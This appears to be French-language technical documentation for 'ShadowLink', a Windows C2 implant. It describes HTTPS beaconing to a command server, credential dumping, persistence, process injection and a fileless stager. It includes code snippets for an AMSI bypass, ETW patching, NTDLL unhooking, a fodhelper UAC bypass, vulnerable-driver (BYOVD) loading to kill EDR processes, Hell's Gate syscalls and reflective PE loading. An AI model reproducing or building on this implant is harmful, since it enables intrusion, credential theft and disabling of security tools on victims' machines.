# 🖥️ ShadowLink Agent - Documentation Technique

## Vue d'ensemble

L'agent ShadowLink est un implant Windows écrit en C qui se connecte au serveur C2 et exécute des commandes à distance. **Phase 11** introduit HTTPS C2, Sleep Obfuscation (Ekko) et Direct Syscalls (Hell's Gate).

---

## 📋 Caractéristiques Techniques

| Propriété | Valeur |
|-----------|--------|
| Langage | C (C99) |
| Plateforme | Windows x64 |
| Taille | ~480 KB (full) / ~48 KB (stager) |
| Compilateur | GCC (MinGW-w64) |
| Dépendances | ws2_32, winhttp, advapi32, psapi |
| Chiffrement | AES-256-CBC |
| Transport | HTTPS (Phase 11) / TCP (legacy) |

---

## 🏗️ Architecture du Code

```
agent/
├── agent.c              # Agent principal + logique de commandes
├── agent.h              # Headers et configuration
├── aes.c / aes.h        # Chiffrement AES-256 (tiny-AES-c)
├── https_transport.c/h  # Transport HTTPS (Phase 11)
├── sleep_obfuscation.c/h # Sleep Obfuscation Ekko (Phase 11)
├── syscalls.c/h         # Direct Syscalls Hell's Gate (Phase 11)
└── syscalls_asm.asm     # Stubs assembleur syscalls (optionnel)

stager/
└── stager.c             # Stager minimal avec PE Reflective Loading
```

### Architecture interne

```
agent.c
├── Configuration
│   ├── SERVER_IP (chiffré XOR)
│   ├── SERVER_PORT / HTTPS_PORT
│   └── Délais et timeouts
│
├── Évasion (Phase 7)
│   ├── XOR String Encryption
│   ├── API Hashing (djb2)
│   ├── Anti-Debug (IsDebuggerPresent, Timing)
│   ├── Anti-VM (Processes, Resources)
│   ├── Anti-Sandbox (Delayed execution)
│   ├── Process Masquerading (PEB)
│   └── Self-deletion
│
├── Anti-EDR (Phase 8)
│   ├── AMSI Bypass
│   ├── ETW Patching
│   └── NTDLL Unhooking
│
├── Direct Syscalls (Phase 11)
│   ├── Hell's Gate
│   ├── Syscall Table
│   └── NtAllocateVirtualMemory, etc.
│
├── Sleep Obfuscation (Phase 11)
│   └── Ekko (ROP + Timer + XOR)
│
├── HTTPS Transport (Phase 11)
│   ├── https_init()
│   ├── https_beacon()
│   └── https_send_result()
│
├── Credentials (Phase 9)
│   ├── WiFi passwords
│   ├── Browser paths
│   └── Credential Manager
│
├── Privilege Escalation (Phase 10)
│   ├── UAC Bypass (fodhelper, eventvwr)
│   ├── BYOVD
│   └── Token manipulation
│
└── Process Injection (Phase 9b)
    ├── Classic injection
    ├── PPID Spoofing
    └── Process migration
```

---

## 🌐 Transport HTTPS (Phase 11)

### Communication C2

```
┌──────────────┐                                    ┌──────────────┐
│    AGENT     │                                    │    SERVER    │
│              │                                    │              │
│  ┌────────┐  │     HTTPS (Port 443)              │  ┌────────┐  │
│  │WinHTTP │──┼───────────────────────────────────┼──│ Flask  │  │
│  └────────┘  │     TLS Encrypted                 │  └────────┘  │
│      │       │                                    │      │       │
│      ▼       │     Endpoints REST:               │      ▼       │
│  ┌────────┐  │     GET /api/v1/updates           │  ┌────────┐  │
│  │ AES256 │  │     POST /api/v1/status           │  │ AES256 │  │
│  └────────┘  │     POST /api/v1/telemetry        │  └────────┘  │
│              │                                    │              │
└──────────────┘                                    └──────────────┘
```

### Fichiers

| Fichier | Description |
|---------|-------------|
| `https_transport.h` | Headers et structures HTTPS |
| `https_transport.c` | Implémentation WinHTTP |

### Fonctions principales

```c
// Initialiser la connexion HTTPS
int https_init(HTTPS_CONNECTION *conn, const char *host, int port);

// Check-in (enregistrement agent)
int https_checkin(HTTPS_CONNECTION *conn);

// Beacon (récupérer tâche)
int https_beacon(HTTPS_CONNECTION *conn, char *command, size_t cmd_size);

// Envoyer résultat
int https_send_result(HTTPS_CONNECTION *conn, int task_id, int status, 
                      const char *output);
```

### Structure de connexion

```c
typedef struct {
    HINTERNET hSession;     // Session WinHTTP
    HINTERNET hConnect;     // Connexion au serveur
    char agent_id[64];      // ID unique de l'agent
    char host[256];         // Hostname du serveur
    int port;               // Port (443)
} HTTPS_CONNECTION;
```

---

## 😴 Sleep Obfuscation - Ekko (Phase 11)

### Concept

```
┌────────────────────────────────────────────────────────────┐
│                  SLEEP OBFUSCATION                         │
├────────────────────────────────────────────────────────────┤
│  AVANT SLEEP          PENDANT SLEEP        APRÈS SLEEP    │
│  ────────────         ─────────────        ───────────    │
│  .text: CODE  ──XOR─▶ .text: %#@!&* ──XOR─▶ .text: CODE   │
│  .data: DATA  ──XOR─▶ .data: $@#%^& ──XOR─▶ .data: DATA   │
│  [Détectable]         [Illisible]          [Restauré]     │
└────────────────────────────────────────────────────────────┘
```

### Technique

1. **Avant le sleep** : Chiffrer les sections `.text` et `.data` avec XOR
2. **Créer ROP chain** : VirtualProtect → SystemFunction032 (RC4) → NtContinue
3. **Timer callback** : Utiliser `CreateTimerQueueTimer` pour programmer le réveil
4. **Au réveil** : Le callback ROP déchiffre et restaure les permissions

### Fichiers

| Fichier | Description |
|---------|-------------|
| `sleep_obfuscation.h` | Headers et structures |
| `sleep_obfuscation.c` | Implémentation Ekko |

### Fonction

```c
// Configuration du sleep obfuscation
typedef struct _SLEEP_CONFIG {
    DWORD sleep_time;           // Durée en ms
    DWORD jitter_percent;       // Variation (0-50%)
    BOOL encrypt_heap;          // Chiffrer aussi le heap
    BYTE xor_key[16];           // Clé de chiffrement
} SLEEP_CONFIG;

// Dormir avec obfuscation mémoire
int ekko_sleep(SLEEP_CONFIG *config);
```

### Avantages

| Aspect | Bénéfice |
|--------|----------|
| **Memory scanners** | Code chiffré = pas de signatures |
| **EDR hooks** | Sleep via ROP, pas d'API suspecte |
| **Forensics** | Dump mémoire inexploitable |
| **Timing** | Jitter aléatoire |

---

## 🔧 Direct Syscalls - Hell's Gate (Phase 11)

### Concept

```
┌────────────────────────────────────────────────────────────────┐
│                     APPEL API NORMAL                           │
│                                                                │
│  Agent ──► ntdll.dll ──► [HOOK EDR] ──► syscall ──► Kernel    │
│                              ▲                                 │
│                              │                                 │
│                         DÉTECTION!                             │
└────────────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────────────┐
│                     DIRECT SYSCALL                             │
│                                                                │
│  Agent ──────────────────────────────► syscall ──► Kernel     │
│            (bypass ntdll + hooks)                              │
│                                                                │
│                         INVISIBLE                              │
└────────────────────────────────────────────────────────────────┘
```

### Technique Hell's Gate

1. **Mapper ntdll.dll depuis le disque** (copie propre, non hookée)
2. **Parser les exports** et trouver les fonctions `Nt*`
3. **Extraire le numéro syscall** depuis le pattern `mov eax, <number>`
4. **Appeler syscall directement** avec ce numéro

### Pattern recherché

```asm
; Début d'une fonction syscall dans ntdll
mov r10, rcx        ; 4C 8B D1
mov eax, <syscall>  ; B8 XX XX 00 00  ← On extrait XX XX
syscall             ; 0F 05
ret                 ; C3
```

### Fichiers

| Fichier | Description |
|---------|-------------|
| `syscalls.h` | Headers, structures et numéros syscall |
| `syscalls.c` | Résolution Hell's Gate |
| `syscalls_asm.asm` | Stubs assembleur (optionnel) |

### Syscalls supportés

| Syscall | Usage |
|---------|-------|
| `NtAllocateVirtualMemory` | Allocation mémoire (shellcode) |
| `NtProtectVirtualMemory` | Changer permissions (RWX) |
| `NtWriteVirtualMemory` | Écrire dans autre process |
| `NtCreateThreadEx` | Créer thread remote |
| `NtOpenProcess` | Ouvrir handle sur process |
| `NtClose` | Fermer handles |

### Fonctions

```c
// Table des numéros syscall
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtClose;
} SYSCALL_TABLE;

// Initialiser la table via Hell's Gate
int InitializeSyscallsHellsGate(SYSCALL_TABLE *table);

// Exécuter un syscall direct
NTSTATUS DoSyscall(DWORD syscall_number, ...);
```

---

## 🛡️ Techniques d'Évasion

### 1. XOR String Encryption

```c
// IP chiffrée avec XOR 0x5A
static unsigned char encrypted_ip[] = {0x6b, 0x63, 0x68, 0x74, ...};

void xor_decrypt(char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}
```

### 2. Process Masquerading (PEB)

```c
// Modifier le PEB pour ressembler à svchost.exe
void masquerade_process(const char* fake_name) {
    PEB_PARTIAL* peb = get_peb();
    
    // Modifier ImagePathName
    swprintf(fake_path, MAX_PATH, L"C:\\Windows\\System32\\%S", fake_name);
    peb->ProcessParameters->ImagePathName.Buffer = fake_path;
    
    // Modifier CommandLine
    peb->ProcessParameters->CommandLine.Buffer = fake_cmdline;
}
```

### 3. Anti-Debug

```c
int check_debugger_present() {
    // Méthode 1: API Windows
    if (IsDebuggerPresent()) return 1;
    
    // Méthode 2: Remote debugger
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) return 1;
    
    return 0;
}

int check_timing_attack() {
    // Détecter les breakpoints par timing
    LARGE_INTEGER start, end;
    QueryPerformanceCounter(&start);
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x += i;
    QueryPerformanceCounter(&end);
    
    // Si > 50ms, probablement debuggé
    return (elapsed > 50.0);
}
```

### 4. Anti-VM / Anti-Sandbox

```c
// Processus de VM/sandbox
const char *vm_processes[] = {
    "vmtoolsd.exe", "vboxservice.exe",
    "procmon.exe", "wireshark.exe",
    "x64dbg.exe", "ida64.exe", NULL
};

int check_vm_processes() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    // Parcourir et détecter...
}

int check_low_resources() {
    // < 2GB RAM ou < 2 CPU = suspect
    MEMORYSTATUSEX memInfo;
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys / (1024*1024*1024) < 2) return 1;
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return 1;
    
    return 0;
}
```

---

## 🔓 Anti-EDR (Phase 8)

### AMSI Bypass

```c
int bypass_amsi(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    void *pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: xor eax, eax; ret (return AMSI_RESULT_CLEAN)
    BYTE patch[] = { 0x31, 0xC0, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(pAmsiScanBuffer, 16, oldProtect, &oldProtect);
    return 0;
}
```

### ETW Patching

```c
int patch_etw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void *pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Patch: ret (return immediately)
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    VirtualProtect(pEtwEventWrite, 4, oldProtect, &oldProtect);
    return 0;
}
```

### NTDLL Unhooking

```c
int unhook_ntdll(void) {
    // 1. Mapper ntdll.dll propre depuis le disque
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
    void *pCleanNtdll = MapViewOfFile(...);
    
    // 2. Trouver la section .text
    PIMAGE_SECTION_HEADER pSection = ...;
    
    // 3. Copier .text propre sur .text hookée
    void *pHookedText = (BYTE*)hNtdll + pSection->VirtualAddress;
    void *pCleanText = (BYTE*)pCleanNtdll + pSection->PointerToRawData;
    
    VirtualProtect(pHookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pHookedText, pCleanText, textSize);
    VirtualProtect(pHookedText, textSize, oldProtect, &oldProtect);
    
    return 0;
}
```

---

## 🚀 Privilege Escalation (Phase 10)

### UAC Bypass - fodhelper

```c
int uac_bypass_fodhelper(const char *command, char *result, size_t size) {
    // 1. Créer clé registry ms-settings\shell\open\command
    RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command", ...);
    
    // 2. Définir la commande à exécuter
    RegSetValueExA(hKey, NULL, 0, REG_SZ, cmdLine, strlen(cmdLine) + 1);
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, "", 1);
    
    // 3. Lancer fodhelper.exe (auto-elevate)
    CreateProcessA(NULL, "C:\\Windows\\System32\\fodhelper.exe", ...);
    
    // 4. Cleanup registry
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    
    return 0;
}
```

### BYOVD (Bring Your Own Vulnerable Driver)

```c
// Charger un driver vulnérable signé (ex: RTCore64.sys)
int byovd_load_driver(const char* driver_path, char *result, size_t size) {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    
    hService = CreateServiceA(hSCManager, "RTCore64", "RTCore64",
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, full_path, ...);
    
    StartServiceA(hService, 0, NULL);
    
    // Ouvrir le device pour les opérations kernel
    g_hVulnDriver = CreateFileA("\\\\.\\RTCore64", ...);
    
    return 0;
}

// Lire/écrire mémoire kernel via le driver
DWORD64 byovd_read_memory(DWORD64 address, DWORD size);
int byovd_write_memory(DWORD64 address, DWORD value, DWORD size);
```

---

## 📝 Commandes Disponibles

### Contrôle

| Commande | Description |
|----------|-------------|
| `help` | Affiche l'aide |
| `exit` | Déconnecte (reconnexion auto) |
| `die` | Termine définitivement |
| `selfdestruct` | Supprime du disque et termine |

### Reconnaissance

| Commande | Description |
|----------|-------------|
| `recon` | Rapport complet système |
| `ps` | Liste les processus |
| `kill <pid>` | Tue un processus |

### Persistance

| Commande | Description |
|----------|-------------|
| `persist` | Installe la persistance (Registry Run) |
| `unpersist` | Supprime la persistance |
| `checkpersist` | Vérifie si active |
| `install` | Installation stealth complète |

### Credentials (Phase 9)

| Commande | Description |
|----------|-------------|
| `creds` | Dump toutes les credentials |
| `wifi` | Dump mots de passe WiFi |
| `browsers` | Localise fichiers navigateurs |

### Process Injection (Phase 9b)

| Commande | Description |
|----------|-------------|
| `targets` | Liste les cibles d'injection |
| `inject <pid>` | Injecte dans un PID |
| `migrate <name>` | Migre vers un processus |

### Privilege Escalation (Phase 10)

| Commande | Description |
|----------|-------------|
| `isadmin` | Vérifie les privilèges |
| `privesc` | Énumère les vecteurs |
| `elevate fodhelper` | UAC bypass fodhelper |
| `elevate eventvwr` | UAC bypass eventvwr |
| `byovd load <path>` | Charge driver vulnérable |
| `byovd targets` | Liste processus EDR/AV |
| `byovd kill <pid>` | Kill depuis kernel |

### Anti-EDR (Phase 8)

| Commande | Description |
|----------|-------------|
| `antiedr` | Applique tous les bypass |
| `checksec` | Vérifications de sécurité |
| `stealth on/off` | Active/désactive évasion |

### File Transfer

| Commande | Description |
|----------|-------------|
| `download <path>` | Télécharge depuis agent |
| `upload <path>` | Upload vers agent |

---

## 🔄 Flux d'Exécution

```
main()
│
├─► srand(time)
│
├─► apply_process_masquerade()     ← Se déguise en svchost.exe
│
├─► [Stealth Mode?]
│   └─► delayed_execution(10s)     ← Anti-sandbox
│       └─► [Sandbox?] → evasion_exit()
│
├─► perform_evasion_checks()
│   ├─► is_debugged()
│   └─► is_virtual_machine()
│       └─► [Detected?] → evasion_exit()
│
├─► apply_anti_edr()               ← Phase 8
│   ├─► unhook_ntdll()
│   ├─► init_syscall_table()       ← Hell's Gate
│   ├─► bypass_amsi()
│   └─► patch_etw()
│
├─► InitializeSyscallsHellsGate()  ← Phase 11
│
├─► https_init()                   ← Phase 11 HTTPS
│
└─► while(1) [Main Loop]
    │
    ├─► https_beacon()             ← Récupère tâche
    │
    ├─► [Task received?]
    │   ├─► Execute command
    │   └─► https_send_result()    ← Renvoie résultat
    │
    └─► ekko_sleep(config)         ← Sleep obfuscation
```

---

## 🛠️ Compilation

### Flags de compilation

```bash
# Agent complet (debug)
gcc -o agent.exe agent.c aes.c https_transport.c sleep_obfuscation.c syscalls.c \
    -lws2_32 -lwinhttp -ladvapi32 -lpsapi -DAES256=1

# Agent stealth (sans console)
gcc -o agent.exe agent.c aes.c https_transport.c sleep_obfuscation.c syscalls.c \
    -lws2_32 -lwinhttp -ladvapi32 -lpsapi -DAES256=1 -mwindows

# Stager minimal
gcc -Os -s -DBUILD_STAGER_EXE -o stager.exe stager.c -lwinhttp -mwindows
```

### Avec Makefile

```bash
make agent          # Debug build
make agent-stealth  # Stealth build (no console)
make stager         # Minimal stager (~48KB)
```

---

## 📦 Stager (Phase 11)

### Concept

Le stager est un loader minimal qui :
1. Télécharge le payload chiffré via HTTPS
2. Déchiffre avec RC4
3. Charge en mémoire via PE Reflective Loading
4. Exécute sans toucher le disque (fileless)

### Taille

| Build | Taille |
|-------|--------|
| Agent complet | ~480 KB |
| Stager | ~48 KB |

### Reflective PE Loading

```c
int reflective_load_pe(BYTE *pe_data, size_t pe_size) {
    // 1. Parser DOS/NT headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pe_data;
    PIMAGE_NT_HEADERS ntHeaders = ...;
    
    // 2. Allouer mémoire à l'adresse préférée
    void *imageBase = VirtualAlloc(
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,
        ntHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 3. Copier les sections
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        memcpy(imageBase + section->VirtualAddress,
               pe_data + section->PointerToRawData,
               section->SizeOfRawData);
    }
    
    // 4. Appliquer les relocations si nécessaire
    if (imageBase != preferredBase) {
        apply_relocations(imageBase, delta);
    }
    
    // 5. Résoudre les imports
    resolve_imports(imageBase);
    
    // 6. Appeler l'entry point
    typedef int (*EntryPoint)(void);
    EntryPoint entry = (EntryPoint)(imageBase + 
        ntHeaders->OptionalHeader.AddressOfEntryPoint);
    entry();
    
    return 0;
}
```

---

## ⚠️ Limitations Connues

### Phase 11

1. **Certificat SSL non vérifié** - Agent accepte tout certificat
2. **Syscalls x64 uniquement** - Pas de support x86
3. **Sleep obfuscation basique** - Pattern ROP détectable
4. **Pas d'indirect syscalls** - Appel direct visible

### Améliorations futures

1. **Indirect Syscalls** - Exécuter depuis ntdll légitime
2. **Egg Hunting** - Trouver syscalls dynamiquement
3. **PPID Spoofing** - Cacher parent process
4. **ETW-TI bypass** - Désactiver Threat Intelligence
5. **CallStack Spoofing** - Masquer l'origine des appels

---

## 📊 MITRE ATT&CK Mapping

| ID | Technique | Implémentation |
|----|-----------|----------------|
| T1055 | Process Injection | `inject_into_process()` |
| T1055.012 | Process Hollowing | Stager reflective loading |
| T1547.001 | Registry Run Keys | `install_persistence()` |
| T1562.001 | Disable Security Tools | AMSI/ETW bypass |
| T1027 | Obfuscated Files | XOR strings, AES comms |
| T1497 | Sandbox Evasion | Anti-VM, Anti-sandbox |
| T1106 | Native API | Direct syscalls Hell's Gate |
| T1548.002 | UAC Bypass | fodhelper, eventvwr |
| T1068 | Exploitation for Priv Esc | BYOVD |
| T1003 | Credential Dumping | WiFi, Vault, Browser |
| T1071.001 | Web Protocols | HTTPS C2 |
| T1573.001 | Encrypted Channel | TLS + AES-256 |
| T1620 | Reflective Code Loading | PE Reflective Load |
